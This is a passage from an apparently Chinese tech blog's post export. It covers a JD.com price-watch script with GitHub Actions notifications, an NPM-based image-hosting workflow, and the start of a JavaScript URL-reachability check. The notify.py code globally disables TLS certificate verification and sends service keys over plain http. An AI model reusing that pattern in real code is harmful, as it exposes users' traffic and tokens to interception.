thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    